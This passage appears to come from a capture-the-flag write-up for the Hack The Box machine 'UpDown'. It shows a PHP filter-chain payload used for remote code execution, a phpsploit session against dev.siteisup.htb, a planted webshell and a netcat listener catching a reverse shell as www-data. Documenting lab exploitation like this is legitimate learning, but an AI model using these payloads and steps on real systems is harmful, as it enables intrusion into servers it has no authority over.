nv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

```bash
phpsploit > set target 'http://dev.siteisup.htb/?page=php://filter/convert.iconv.UTF8.CSISO2022KR|...'
```

```bash
[*] Shell obtained by PHP (10.10.16.30 -> 10.129.227.227)

Connected to Linux server (dev.siteisup.htb)
running PHP 8.0.20 on Apache/2.4.41 (Ubuntu)
phpsploit(dev.siteisup.htb) > ls
[proxychains] Strict chain  ...  127.0.0.1:8090  ...  10.129.227.227:80  ...  OK

Listing: /var/www/dev
=====================

Mode        Owner     Group     Size  Last Modified                   Name
----        -----     -----     ----  -------------                   ----
drwxr-xr-x  www-data  www-data  4K    Wed Jun 22 15:45:07 +0000 2022  .
drwxr-xr-x  www-data  www-data  4K    Wed Jun 22 15:45:02 +0000 2022  ..
-rw-r--r--  www-data  www-data  115   Wed Oct 20 23:51:46 +0000 2021  .htaccess
-rw-r--r--  www-data  www-data  24    Wed Oct 20 17:09:54 +0000 2021  admin.php
-rw-r--r--  www-data  www-data  3,1K  Wed Oct 20 17:39:42 +0000 2021  checker.php
-rw-r--r--  www-data  www-data  273   Wed Oct 20 17:28:52 +0000 2021  index.php
-rw-r--r--  www-data  www-data  5,4K  Wed Oct 20 14:28:52 +0000 2021  stylesheet.css
drwxr-xr-x  www-data  www-data  4K    Wed Dec 20 14:30:01 +0000 2023  uploads
```

### Get a shell

Write the webshell we created with `proc_open` previously 

> `upload` function doesn't work, it seems to be using disabled functions
{: .prompt-tip }

```bash
phpsploit(dev.siteisup.htb) > edit ok.php
[proxychains] Strict chain  ...  127.0.0.1:8090  ...  10.129.227.227:80  ...  OK
[*] Creating new file: /var/www/dev/ok.php
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:8090  ...  10.129.227.227:80  ...  OK
[*] File correctly written at /var/www/dev/ok.php
```

Visit http://dev.siteisup.htb/ok.php

```bash
┌──(bravosec㉿fsociety)-[/media/sf_Kali/htb/Machine/updown]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.227.227] 38310
bash: cannot set terminal process group (898): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



